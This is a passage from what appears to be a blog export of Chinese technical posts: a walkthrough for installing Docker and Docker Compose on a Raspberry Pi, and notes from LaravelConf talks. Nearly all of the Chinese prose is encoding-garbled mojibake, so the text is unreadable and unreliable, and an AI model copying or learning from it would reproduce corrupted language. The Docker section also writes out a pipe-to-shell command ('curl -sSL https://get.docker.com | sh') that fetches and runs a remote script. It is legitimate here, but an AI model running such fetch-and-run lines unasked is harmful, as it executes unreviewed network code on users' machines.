æ³•å®‰è£…çš„é—®é¢˜ã€‚æˆ‘è¯•äº†æœ€æ–°çš„ä¸¤ä¸ª Lite å®‰è£…åŒ…ï¼Œä¸€ä¸ªå‡ºç°<code>cma_alloc alloc failed</code>çš„é”™è¯¯ï¼Œå¦ä¸€ä¸ªå…‰æ ‡ä¸€ç›´åœ¨å±å¹•å·¦ä¸Šè§’é—ªçƒã€‚æœ€åé€šè¿‡è¯¥çƒ§å½•è½¯ä»¶é¡ºåˆ©å®Œæˆã€‚<br>å‚è€ƒèµ„æ–™ <a href="https://www.youtube.com/watch?v=y5SOuBOy2ZQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=y5SOuBOy2ZQ</a></p></blockquote><h2 id="Step-3-å®‰è£…ç³»ç»Ÿ"><a href="#Step-3-å®‰è£…ç³»ç»Ÿ" class="headerlink" title="Step 3 å®‰è£…ç³»ç»Ÿ"></a>Step 3 å®‰è£…ç³»ç»Ÿ</h2><p>å½“çƒ§å½•å®Œæˆåï¼Œå°†å†…å­˜å¡å¼¹å‡ºï¼Œç„¶åæ’å…¥æ ‘è“æ´¾ï¼Œå¹¶è¿æ¥ HDMI æ¥å£çš„æ˜¾ç¤ºå™¨ä¸é”®ç›˜ã€‚å½“ä»¥ä¸Šå·¥ä½œéƒ½å®Œæˆåï¼Œå¯¹æ ‘è“æ´¾è¿›è¡Œä¾›ç”µï¼Œæ­¤æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ‰§è¡Œå®‰è£…æ“ä½œ</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d3lmipe3j30ma0jq0w5.jpg" alt=""></p><p>å½“æœ€åå‡ºç° login æ—¶ï¼Œè¡¨ç¤ºç³»ç»Ÿå·²ç»å®‰è£…å®Œæˆã€‚æ ‘è“æ´¾çš„é»˜è®¤ç”¨æˆ·åä¸º piï¼Œå¯†ç ä¸º raspberryã€‚root ç”¨æˆ·éœ€è¦é€šè¿‡å‘½ä»¤ <code>sudo passwd root</code> æ¿€æ´»å¹¶è®¾ç½®å¯†ç ã€‚</p><h2 id="Step-4-ç³»ç»Ÿè®¾ç½®"><a href="#Step-4-ç³»ç»Ÿè®¾ç½®" class="headerlink" title="Step 4 ç³»ç»Ÿè®¾ç½®"></a>Step 4 ç³»ç»Ÿè®¾ç½®</h2><p>è¾“å…¥å‘½ä»¤<code>sudo raspi-config</code>è¿›å…¥ç³»ç»Ÿé…ç½®é¡µã€‚</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d3qh6emrj314m0loq6p.jpg" alt=""></p><p>æ­¤å¤„å¯è®¾ç½® WiFi ç½‘ç»œã€sshã€æ—¶åŒºç­‰ç›¸å…³ä¿¡æ¯ã€‚</p><h2 id="Step-5-å®‰è£…-Docker"><a href="#Step-5-å®‰è£…-Docker" class="headerlink" title="Step 5 å®‰è£… Docker"></a>Step 5 å®‰è£… Docker</h2><p>æ ¹æ® Docker <a href="https://docs.docker.com/install/linux/docker-ce/debian/" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ï¼Œåœ¨æ ‘è“æ´¾ä¸­å®‰è£… dockerï¼Œæ”¯æŒä»¥ä¸‹3ç§æ–¹å¼ï¼š</p><ol><li>é€šè¿‡è®¾ç½® Docker ä»“åº“å®‰è£…ï¼Œè¯¥æ–¹å¼ä¸º debian çš„æ¨èå®‰è£…æ–¹å¼ï¼Œä½†<strong>ä¸æ”¯æŒæ ‘è“æ´¾</strong>ã€‚</li><li>é€šè¿‡ä¸‹è½½ deb åŒ…æ‰‹åŠ¨å®‰è£…ä¸å‡çº§ï¼Œé€‚ç”¨äºæ— ç½‘ç»œçŠ¶æ€ã€‚</li><li>é€šè¿‡<a href="https://docs.docker.com/install/linux/docker-ce/debian/#install-using-the-convenience-script" target="_blank" rel="noopener">å®˜æ–¹è„šæœ¬</a>å®‰è£…ï¼Œé€‚ç”¨äºæµ‹è¯•ä¸å¼€å‘ç¯å¢ƒï¼Œ<strong>åˆ‡å‹¿ç”¨äºç”Ÿäº§ç¯å¢ƒ</strong>ï¼Œä¸”è¯¥æ–¹å¼<strong>ä»…æ”¯æŒæ ‘è“æ´¾</strong>å®‰è£…ã€‚</li></ol><p>æµ·å¤–ç”¨æˆ·å¯é€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªæ•™ç¨‹å®‰è£…ï¼š</p><ol><li><a href="https://pcmac.biz/Docker_Raspberrypi.html" target="_blank" rel="noopener">https://pcmac.biz/Docker_Raspberrypi.html</a></li><li><a href="https://blog.docker.com/2019/03/happy-pi-day-docker-raspberry-pi/" target="_blank" rel="noopener">https://blog.docker.com/2019/03/happy-pi-day-docker-raspberry-pi/</a></li></ol><p>å¤§é™†ç”¨æˆ·å¯é€šè¿‡ä»¥ä¸‹æ•™ç¨‹å®‰è£…ï¼š</p><ul><li><a href="https://yeasy.gitbooks.io/docker_practice/install/raspberry-pi.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/install/raspberry-pi.html</a><br>å¤§é™†ç”±äºç½‘ç»œåŸå› ï¼Œéœ€è¦å°†æ ‘è“æ´¾çš„ä»“åº“é•œåƒæºæ›´æ¢ä¸º<a href="https://mirror.tuna.tsinghua.edu.cn/help/raspbian/" target="_blank" rel="noopener">å›½å†…é•œåƒæº</a><br>åœ¨æ‰§è¡Œ<code>get-docker.sh</code>æ—¶ï¼Œä¹Ÿéœ€è¦æŒ‡å®šä¸ºé˜¿é‡Œäº‘<code>$ sudo sh get-docker.sh --mirror Aliyun</code>åŠ é€Ÿã€‚</li></ul><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“å‰æ ‘è“æ´¾åˆšæ›´æ–°ä¸º debian æœ€æ–°ç‰ˆæœ¬ busterï¼Œä½† docker å°šæœªæ”¯æŒ busterï¼Œå› æ­¤å½“æ‰§è¡Œ<code>curl -sSL https://get.docker.com | sh</code>æ—¶ä¼šé‡åˆ°é”™è¯¯ <code>E: The repository &#39;https://download.docker.com/linux/raspbian 10 Release&#39; does not have a Release file.</code>ã€‚</p><p>é€šè¿‡è¾“å‡ºå¯çŸ¥ï¼Œè„šæœ¬è·å–äº†å½“å‰çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶å†™å…¥äº†æ–‡ä»¶<code>/etc/apt/sources.list.d/docker.list</code>ï¼Œä½†ç°åœ¨å°šä¸æ”¯æŒæœ€æ–°ç‰ˆæœ¬ï¼Œå› æ­¤å¯ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹<code>get-docker.sh</code>æŒ‡å®šè„šæœ¬ä¸ºå¯æ”¯æŒçš„ç‰ˆæœ¬: </p><p><code>$sh_c &quot;echo \&quot;$apt_repo\&quot; &gt; /etc/apt/sources.list.d/docker.list&quot;</code><br>ä¸º<br><code>$sh_c &quot;echo \&quot;deb [arch=armhf] https://mirrors.aliyun.com/docker-ce/linux/raspbian stretch stable\&quot; &gt; /etc/apt/sources.list.d/docker.list&quot;</code>ï¼Œ<br>ç„¶åéªŒè¯<code>/etc/apt/sources.list.d/docker.list</code>çš„å†…å®¹æ˜¯å¦ä¸è„šæœ¬ä¸€è‡´ï¼Œä¸€è‡´å°±å¯ä»¥æ‰§è¡Œè„šæœ¬å¹¶å®‰è£…äº†ã€‚</p></blockquote><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4d8wb2n9xj30u00vtdop.jpg" alt=""></p><p>ç»è¿‡ä¸€ä¸Šåˆçš„æŠ˜è…¾ï¼Œç»ˆäºæˆåŠŸå®‰è£…äº† dockerï¼</p><h2 id="Step-6-å®‰è£…-Docker-Compose"><a href="#Step-6-å®‰è£…-Docker-Compose" class="headerlink" title="Step 6 å®‰è£… Docker Compose"></a>Step 6 å®‰è£… Docker Compose</h2><p>å®‰è£…å®Œ docker åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®‰è£… docker composeã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>sudo apt install python-pip</code>æ¥å®‰è£… Python çš„åŒ…ç®¡ç†å·¥å…·ï¼Œå®‰è£…æˆåŠŸåï¼Œæ‰§è¡Œå‘½ä»¤<code>pip install docker-compose</code>å®‰è£… docker composeï¼Œå®‰è£…è¿‡ç¨‹æ—¶é—´è¾ƒé•¿ï¼ˆå¯ä½¿ç”¨<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose</code>æ¥ä¸´æ—¶ä½¿ç”¨æ¸…å pypi é•œåƒæºï¼‰ï¼Œä¹Ÿå¯èƒ½å› ç½‘ç»œåŸå› å‡ºç°å¤šæ¬¡ä¸­æ–­çš„æƒ…å†µï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚</p><blockquote><p>æ³¨æ„ï¼š<code>sudo apt install python3-pip</code> å®‰è£… pip3 ä¼šæœ‰å¾ˆå¤šçš„é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬é€šè¿‡å®‰è£… pip2 æ¥è§£å†³ã€‚</p></blockquote><h2 id="æ–¹å¼äºŒ"><a href="#æ–¹å¼äºŒ" class="headerlink" title="æ–¹å¼äºŒ"></a>æ–¹å¼äºŒ</h2><p>ä½¿ç”¨ HypriotOS è€Œéæ ‘è“æ´¾å®˜æ–¹ç³»ç»Ÿã€‚<a href="https://blog.hypriot.com/faq/" target="_blank" rel="noopener">è¿™é‡Œ</a>ä»‹ç»äº†ä»€ä¹ˆæ˜¯ HypriotOSã€‚</p><p>è™½ç„¶ä½¿ç”¨è¯¥æ–¹å¼å¯ä»¥å¿«é€Ÿå®‰è£… docker åŠ docker-composeï¼Œä½†å­˜åœ¨ä¸€ä¸ªè‡´å‘½çš„é—®é¢˜â€”â€”WiFi æ— æ³•ä½¿ç”¨ï¼ŒæŸ¥è¯¢äº†å¤§é‡çš„èµ„æ–™åï¼Œéƒ½æ˜¯è¯´ä¿®æ”¹ <code>user-data</code> æ–‡ä»¶çš„ä»¥ä¸‹å†…å®¹ï¼Œä½†æˆ‘å‘ç°åœ¨æœªå¯ç”¨è¿™æ®µä»£ç å‰ï¼Œä½¿ç”¨é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç å¯ä»¥æ­£å¸¸ç™»é™†ï¼Œä½†å¯ç”¨åï¼Œå³ä½¿ä½ æ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä»ç„¶æ— æ³•ç™»é™†ã€‚åŸå› æœªçŸ¥ï¼Œåœ¨ç»è¿‡ä¸€ç•ªæŠ˜è…¾åï¼Œæˆ‘å†³å®šå¼ƒå‘äº†ã€‚</p><p><img src="http://ww2.sinaimg.cn/large/006tNc79ly1g4du26o13wj30g609v75c.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> raspberry pi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaravelConf Taiwan</title>
      <link href="/post/laraconf-taiwan/"/>
      <url>/post/laraconf-taiwan/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww3.sinaimg.cn/large/006tNc79ly1g4d4cfzp7cj310c0e9wh8.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from &#123;&#123;$idea&#125;&#125; to &#123;&#123;$production&#125;&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="LaravelConf-2019"><a href="#LaravelConf-2019" class="headerlink" title="LaravelConf 2019"></a>LaravelConf 2019</h1><h2 id="1-Laravel-åœ¨é«˜ä½µç™¼ä¸‹çš„ç³»çµ±æ¶æ§‹èˆ‡æ•ˆèƒ½å„ªåŒ–-é™³å…‰è³¢-Albert"><a href="#1-Laravel-åœ¨é«˜ä½µç™¼ä¸‹çš„ç³»çµ±æ¶æ§‹èˆ‡æ•ˆèƒ½å„ªåŒ–-é™³å…‰è³¢-Albert" class="headerlink" title="1 Laravel åœ¨é«˜ä½µç™¼ä¸‹çš„ç³»çµ±æ¶æ§‹èˆ‡æ•ˆèƒ½å„ªåŒ– - é™³å…‰è³¢ (Albert)"></a>1 Laravel åœ¨é«˜ä½µç™¼ä¸‹çš„ç³»çµ±æ¶æ§‹èˆ‡æ•ˆèƒ½å„ªåŒ– - é™³å…‰è³¢ (Albert)</h2><p>é«˜å¹¶å‘åˆ†ä¸ºä¸¤ç§åœºæ™¯ï¼Œä¾æ®ä¸åŒåœºæ™¯æœ‰ä¸åŒçš„è§£å†³æ–¹æ¡ˆï¼š<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8zjqspfj0j311w0l90yx.jpg" alt=""></p><p>ç¼“å­˜ä½¿ç”¨æ³¨æ„äº‹é¡¹<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8zjvcummvj311x0l8ago.jpg" alt=""></p><p>å½“ DB ä¸­çš„æ•°æ®æ›´æ–°æ—¶ï¼Œç¼“å­˜åŒæ ·éœ€è¦æ›´æ–°ï¼Œåœ¨ Laravel ä¸­ï¼Œé€šè¿‡è§‚å¯Ÿè€…æ¨¡å¼æ¥å®ç°åŒæ­¥æ›´æ–°ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åº”ç”¨åœºæ™¯ã€‚</p><p>æ ¹æ®â€œäºŒå…«å®šå¾‹â€ï¼ŒDB åœ¨ 20% çš„æ—¶é—´å†™å…¥ï¼Œ80% çš„æ—¶é—´è¯»å–ã€‚(DB ä¸»ä»)</p><p>é€šè¿‡ SQL Proxyï¼Œå¯ä»¥è‡ªåŠ¨è¯†åˆ« SQL çš„è¯»å†™ï¼Œä¹Ÿå¯ä»¥éš”ç¦»å…·ä½“çš„ DBï¼Œä½†åŒæ—¶ä¹Ÿå¯èƒ½é™åˆ¶ä¸€äº› SQL å‡½æ•°çš„ä½¿ç”¨ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8zk2ku5t8j311x0l90xl.jpg" alt=""></p><p>æŠ¢è´­çš„ç‰¹ç‚¹ï¼š</p><ul><li>æŒç»­æ—¶é—´çŸ­</li><li>ç¬æ—¶é«˜å¹¶å‘</li><li>å“åº”ç¼“æ…¢é€ æˆç”¨æˆ·å‘èµ·æ›´å¤šçš„è¯·æ±‚ï¼Œå½¢æˆæ¶æ€§å¾ªç¯</li></ul><p>æŠ¢è´­çš„ä¸€äº›è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>å¯¹æŠ¢è´­çš„å•†å“çƒ­ç‚¹æ•°æ®æå‰é¢„çƒ­è‡³ Redis ä¸­</li><li>é€šè¿‡ Redis çš„<code>set setnx</code>é™åˆ¶ç”¨æˆ·çš„é‡å¤æäº¤</li><li>é‡‡ç”¨æ¶ˆæ¯é˜Ÿåˆ—å¤„ç† DB å†™å…¥</li><li>å½“è¯·æ±‚æ¥è¿‘æœ€å¤§è´Ÿè½½æ—¶ï¼Œæ‹’ç»æœåŠ¡å“åº”ï¼Œè§¦å‘ç†”æ–­è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶</li><li>è¿‡æ»¤è¯·æ±‚</li></ul><p>é«˜å¹¶å‘çš„æ ¸å¿ƒé—®é¢˜å°±æ˜¯ï¼Œå¦‚ä½•å°†å½“å‰æœåŠ¡æ— æ³•æ‰¿è½½çš„è¯·æ±‚é™ä½åˆ°å¯ä»¥æ‰¿å—çš„èŒƒå›´å†…ï¼Ÿ<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8zk76jaetj30mb0j9q59.jpg" alt=""></p><p>æ¶æ„è®¾è®¡æ—¶éœ€è¦æ³¨æ„ä¿ç•™æœ‰å¼¹æ€§ï¼Œå†éšç€ä¸šåŠ¡çš„å‘å±•å †å ã€‚</p><h1 id="LaravelConf-2018"><a href="#LaravelConf-2018" class="headerlink" title="LaravelConf 2018"></a>LaravelConf 2018</h1><h2 id="1-ç«™ç‚¹å›½é™…åŒ–"><a href="#1-ç«™ç‚¹å›½é™…åŒ–" class="headerlink" title="1 ç«™ç‚¹å›½é™…åŒ–"></a>1 <a href="https://www.youtube.com/watch?v=IOrOCBkrADw&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=3" target="_blank" rel="noopener">ç«™ç‚¹å›½é™…åŒ–</a></h2><p>æˆ‘ä»¬å¯é€šè¿‡ç”¨æˆ·çš„ Sessionã€IPã€è®¾å®šåå¥½ç­‰æ–¹å¼æ¥ç¡®å®šç”¨æˆ·çš„ä½ç½®ï¼Œå¹¶å‘ˆç°å‡ºæœ¬åœ°åŒ–ä¿¡æ¯ï¼Œå¦‚è¯­è¨€ã€æ—¶é—´ã€å¸ç§ç­‰ã€‚<br>geoip2/geoip2 å¯ä»¥é€šè¿‡ IP è·å–åˆ°ç›¸å…³çš„åœ°åŒºã€æ—¶åŒºã€è¯­è¨€ç­‰ä¿¡æ¯</p><h3 id="1-1-è¯­è¨€"><a href="#1-1-è¯­è¨€" class="headerlink" title="1.1 è¯­è¨€"></a>1.1 è¯­è¨€</h3><p>åœ¨ Laravel 5.x ä¸­ï¼Œå¯è®¾å®š<code>/config/app.php</code>ä¸­çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$local = App::getLocale();</span><br><span class="line">App::setLocale($locale);</span><br></pre></td></tr></table></figure><p>Locale çš„åç§°éœ€è¦ä¸ lang ç›®å½•çš„åç§°ç›¸åŒ<br><code>en =&gt; /resources/lang/en</code></p><p>å¯ä»¥ä¸€ç§è¯­è¨€å¯¹åº”ä¸€ä¸ª view ç›®å½•ï¼Œä¹Ÿå¯ä»¥å¤šç§è¯­è¨€å¯¹åº”ä¸€ä¸ª view(å¦‚ en-us ä¸ en-uk å¯¹åº” en)</p><p>phpå¯ä»¥ä½¿ç”¨<code>mcamara/laravel-localization</code>æ¥å¤„ç†æœ¬åœ°åŒ–é—®é¢˜ï¼š</p><ol><li>å¦‚æœè¯­è¨€åœ¨ç½‘å€ä¸­æ²¡æœ‰æºå¸¦ï¼Œåˆ™å¯ä»¥ä¾æ®æ­¤åŒ…ä¸­çš„è®¾å®šï¼Œå†³å®šä½¿ç”¨<code>app.php</code>ä¸­çš„é»˜è®¤è¯­è¨€ï¼Œè¿˜æ˜¯æµè§ˆå™¨è¯·æ±‚å¤´ä¸­çš„<code>Accept-Language</code></li><li>å°†æ²¡æœ‰è¯·æ±‚è¯­è¨€çš„ç½‘å€è‡ªåŠ¨ 301 åˆ°è®¾å®šçš„é»˜è®¤è¯­è¨€</li></ol><h3 id="1-2-ç½‘å€"><a href="#1-2-ç½‘å€" class="headerlink" title="1.2 ç½‘å€"></a>1.2 ç½‘å€</h3><h4 id="1-2-1-ä»¥å›½å®¶åšåŒºåˆ†"><a href="#1-2-1-ä»¥å›½å®¶åšåŒºåˆ†" class="headerlink" title="1.2.1 ä»¥å›½å®¶åšåŒºåˆ†"></a>1.2.1 ä»¥å›½å®¶åšåŒºåˆ†</h4><p><a href="http://example.com/cn" target="_blank" rel="noopener">http://example.com/cn</a><br>ç›¸å…³ISOæ ‡å‡†ï¼šISO-3166-1<br>ç¤ºä¾‹ï¼šAppleã€Google</p><h4 id="1-2-2-ä»¥è¯­è¨€åšåŒºåˆ†"><a href="#1-2-2-ä»¥è¯­è¨€åšåŒºåˆ†" class="headerlink" title="1.2.2 ä»¥è¯­è¨€åšåŒºåˆ†"></a>1.2.2 ä»¥è¯­è¨€åšåŒºåˆ†</h4><p><a href="http://example.com/zh" target="_blank" rel="noopener">http://example.com/zh</a><br>ç›¸å…³ISOæ ‡å‡†ï¼šISO-639-1<br>ç¤ºä¾‹ï¼šLINE</p><h3 id="1-3-æ—¶é—´"><a href="#1-3-æ—¶é—´" class="headerlink" title="1.3 æ—¶é—´"></a>1.3 æ—¶é—´</h3><p>å¤§å¤šè·¨å¢ƒç½‘ç«™çš„æ—¶åŒºè®¾å®šä¸º UTC<br>æ—¶åŒºè®¾å®šä¸º UTCï¼Œå­˜å‚¨æ—¶é—´ä¿¡æ¯æ—¶å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼</p><ol><li>å‰ç«¯è¯·æ±‚çš„æ—¶é—´è½¬æ¢ä¸º UTC åå‘é€ç»™åç«¯</li><li>å‰ç«¯è¯·æ±‚ä¸­æºå¸¦æ—¶åŒºä¿¡æ¯ï¼Œç”±åç«¯è½¬æ¢ä¸º UTC</li></ol><blockquote><p>æ³¨æ„å¤ä»¤æ—¶å¯¹åŒä¸€æ—¶åŒºçš„æ—¶é—´å½±å“ã€‚</p></blockquote><p>phpä¸­å¯ä»¥ä½¿ç”¨<code>nesbot/carbon</code>æ¥å¤„ç†æ—¶é—´é—®é¢˜</p><h3 id="1-4-å¸ç§"><a href="#1-4-å¸ç§" class="headerlink" title="1.4 å¸ç§"></a>1.4 å¸ç§</h3><p>é—®é¢˜ä¸€ï¼šè¯¥å¹³å°å…è®¸äº¤æ˜“çš„å¸ç§æœ‰å“ªäº›ï¼Ÿ<br>é—®é¢˜äºŒï¼šå¦‚æœæ”¯æŒå¤šç§å¸ç§ï¼Œæ˜¯å¦å¯ä»¥è®¾å®šåŸºç¡€å¸ç§<br>é—®é¢˜ä¸‰ï¼šä½¿ç”¨å›ºå®šæ±‡ç‡è¿˜æ˜¯æµ®åŠ¨æ±‡ç‡ï¼Ÿ</p><p>å¯ä½¿ç”¨<code>moneyphp/money</code>ã€<code>webpatser/laravel-countries</code>ä¸<code>torann/currency</code></p><h3 id="1-5-æ•°æ®æ ¼å¼"><a href="#1-5-æ•°æ®æ ¼å¼" class="headerlink" title="1.5 æ•°æ®æ ¼å¼"></a>1.5 æ•°æ®æ ¼å¼</h3><p>æ‰‹æœºå·ã€åœ°å€<br><code>giggsey/libphonenumber-for-php</code>å¯å¤„ç†æ‰‹æœºå·ä¿¡æ¯ã€å¦‚æ ¼å¼åŒ–ã€è·å–å›½å®¶ã€è¿è¥å•†ç­‰<br><code>commerceguys/addressing</code> å¯ç”¨äºå¤„ç†åœ°å€ä¿¡æ¯</p><h2 id="2-å°é¡¹ç›®çš„åˆ¶ä½œä¸æ¨å¹¿"><a href="#2-å°é¡¹ç›®çš„åˆ¶ä½œä¸æ¨å¹¿" class="headerlink" title="2 å°é¡¹ç›®çš„åˆ¶ä½œä¸æ¨å¹¿"></a>2 <a href="https://www.youtube.com/watch?v=OqwwOpVuImY&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=6" target="_blank" rel="noopener">å°é¡¹ç›®çš„åˆ¶ä½œä¸æ¨å¹¿</a></h2><ol><li>å¾ˆå¤šåŠŸèƒ½å¯èƒ½å¹¶ä¸ç¡®å®šæ˜¯å¦ä¼šæœ‰å¥½çš„åå“ï¼Œæ­¤æ—¶åº”è¯¥å…ˆå¿«é€Ÿåšä¸€ä¸ªåŸºç¡€åŠŸèƒ½æ¨å‡ºï¼Œæ ¹æ®ç”¨æˆ·ä½¿ç”¨æƒ…å†µå†å†³å®šæ–¹å‘ã€‚</li><li>ç½‘ç«™å¯é€šè¿‡æèµ æˆ–è€…å‡ºå”®ï¼Œæˆ–è€…ä¸ºå®¢æˆ·å®šåˆ¶åŒ–æ¥ç›ˆåˆ©ï¼ˆå®šåˆ¶åŒ–å¯å°†åŸºç¡€åŠŸèƒ½å¼€æºï¼Œç„¶åå¯¹æ­å»ºä¸ç»´æŠ¤ç³»ç»Ÿè¿›è¡Œæ”¶è´¹ï¼‰</li><li>Laravel module ä¸ Git tree å¯ä»¥ç®¡ç†å¤šä¸ªç›¸ä¼¼å®šåˆ¶åŒ–çš„é¡¹ç›®</li></ol><h2 id="3-å·¥ç¨‹å¸ˆçš„èŒä¸šè§„åˆ’"><a href="#3-å·¥ç¨‹å¸ˆçš„èŒä¸šè§„åˆ’" class="headerlink" title="3 å·¥ç¨‹å¸ˆçš„èŒä¸šè§„åˆ’"></a>3 å·¥ç¨‹å¸ˆçš„èŒä¸šè§„åˆ’</h2><h3 id="3-1-Juniorï¼ˆæ¯•ä¸š5å¹´å†…ï¼‰"><a href="#3-1-Juniorï¼ˆæ¯•ä¸š5å¹´å†…ï¼‰" class="headerlink" title="3.1 Juniorï¼ˆæ¯•ä¸š5å¹´å†…ï¼‰"></a>3.1 Juniorï¼ˆæ¯•ä¸š5å¹´å†…ï¼‰</h3><ul><li>å¯»æ‰¾æ–¹å‘ï¼Œèå…¥è¡Œä¸šï¼ˆåŠ å…¥å¤§å‹ç¨³å®šå…¬å¸ï¼Œå­¦ä¹ é«˜æ•ˆè¡Œäº‹èƒ½åŠ›ã€è¡Œä¸šè§„èŒƒåŠèŒä¸šä»·å€¼è§‚ï¼‰</li></ul><h3 id="3-2-Seniorï¼ˆæ¯•ä¸š5-10å¹´ï¼‰"><a href="#3-2-Seniorï¼ˆæ¯•ä¸š5-10å¹´ï¼‰" class="headerlink" title="3.2 Seniorï¼ˆæ¯•ä¸š5~10å¹´ï¼‰"></a>3.2 Seniorï¼ˆæ¯•ä¸š5~10å¹´ï¼‰</h3><ul><li><strong>æŒ‘å¥½çš„äº§å“ã€å¥½çš„å›¢é˜Ÿæ–‡åŒ–åŠ å…¥</strong>ï¼ˆåŠ å…¥æœ‰æ½œåŠ›ã€æ­£åœ¨å¿«é€Ÿæˆé•¿çš„å…¬å¸ï¼Œç§¯ç´¯å¾ˆå¤šç»éªŒã€‚æœ€å¥½æ˜¯é¢å‘æ™®é€šç”¨æˆ·å‹äº§å“çš„ç²¾è‹±å›¢é˜Ÿã€‚<em>åœ¨ä¸‹ä»½å·¥ä½œæ—¶ï¼Œè¦æ‰¾è‡ªå·±æ„Ÿå…´è¶£çš„ C ç«¯äº§å“ï¼Œè¯¢é—®å…¬å¸çš„åŠ ç­æ–‡åŒ–åŠè‡ªç”±åº¦ï¼Œæ¯”å¦‚ï¼šæˆ‘ä»¬é€šå¸¸çš„ä¸Šä¸‹ç­æ—¶é—´ï¼Ÿè´µå…¬å¸å¯¹ç»å¸¸åŠ ç­æ€ä¹ˆçœ‹ï¼Ÿæ˜¯å¦ä¼šå…è®¸è¿œç¨‹å·¥ä½œï¼Ÿæ˜¯å¦ä¼šæœ‰ç»å¸¸ä¼šæœ‰å‡Œæ™¨ä¸Šçº¿ï¼Ÿ</em>ï¼‰</li></ul><h3 id="3-3-æ¥æ¡ˆè€…"><a href="#3-3-æ¥æ¡ˆè€…" class="headerlink" title="3.3 æ¥æ¡ˆè€…"></a>3.3 æ¥æ¡ˆè€…</h3><ul><li>è‡ªç”±ï¼Œä½†æéœ€è‡ªå¾‹ä¸ä¸¥è°¨</li></ul><p>æ— æ³•è½¬æ¢ä¸ºäº§å“çš„æŠ€æœ¯æ²¡æœ‰ä»·å€¼ã€‚<br>ä¸€ä¸ªä¼˜ç§€çš„å·¥ç¨‹å¸ˆä¸ä¼šåªä¼šä¸€ç§è¯­è¨€ï¼Œä¸ä¼šåªèƒ½å†™ä¸šåŠ¡ä»£ç ã€‚</p><h3 id="3-4-èŒä¸šç”Ÿæ¶¯æ€ä¹ˆèµ°"><a href="#3-4-èŒä¸šç”Ÿæ¶¯æ€ä¹ˆèµ°" class="headerlink" title="3.4 èŒä¸šç”Ÿæ¶¯æ€ä¹ˆèµ°"></a>3.4 <a href="https://www.youtube.com/watch?v=jEe1zOCtPCk&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=7" target="_blank" rel="noopener">èŒä¸šç”Ÿæ¶¯æ€ä¹ˆèµ°</a></h3><p>é’±ï¼Ÿå‰é€”ï¼Ÿè‡ªå·±å–œæ¬¢çš„äº‹ï¼Ÿ</p><p>é’±å¾ˆé‡è¦ï¼Œä½†ä»€ä¹ˆæ—¶å€™å˜ç°æ›´é‡è¦</p><p>åœ¨èŒä¸šåæœŸï¼Œæ›´éœ€è¦å°†æŠ€æœ¯è½¬æ¢ä¸ºäº§å“ï¼Œä¸€ä¸ªäº†è§£æŠ€æœ¯å’Œç”¨æˆ·çš„äº§å“ä¼šæœ‰ç»å¯¹ä¼˜åŠ¿ã€‚<br>åœ¨å¼€å‘ä¸€äº›ä¸è®¤åŒçš„åŠŸèƒ½æ—¶ï¼Œå¯ä»¥è¯¢é—®äº§å“ä¸è¿è¥ï¼Œçœ‹çœ‹ä»–ä»¬çš„æ€ç»´è§’åº¦ä¸æ–¹å¼ã€‚</p><p>æ¶æ„å¸ˆä¸äº†è§£äº§å“çš„æŠ€æœ¯æ˜¯å¸‚é¢å¾ˆç¼ºä¹çš„äººæ‰ã€‚</p><p>ç®€å†å¯ä»¥å†™çš„æ›´å¯Œæœ‰åˆ›æ„ï¼Œæ¯”å¦‚ json æ ¼å¼ï¼Œé¢è¯•è¯­è¨€ä»£ç ç­‰ã€‚è‡³å°‘åœ¨ç®€å†ç­›é€‰å…³èƒ½è·å¾—è¾ƒé«˜çš„é€šè¿‡ç‡</p><h2 id="4-Laravel-èˆ‡-Swoole-çš„æ•´åˆä¹‹è·¯"><a href="#4-Laravel-èˆ‡-Swoole-çš„æ•´åˆä¹‹è·¯" class="headerlink" title="4 Laravel èˆ‡ Swoole çš„æ•´åˆä¹‹è·¯"></a>4 <a href="https://www.youtube.com/watch?v=wTrUOWuJBl0&list=PLVBnNBXRHG-jCJ8e2vfiCJCS2ipfX9-Rf&index=12" target="_blank" rel="noopener">Laravel èˆ‡ Swoole çš„æ•´åˆä¹‹è·¯</a></h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸€ä¸ª PHP 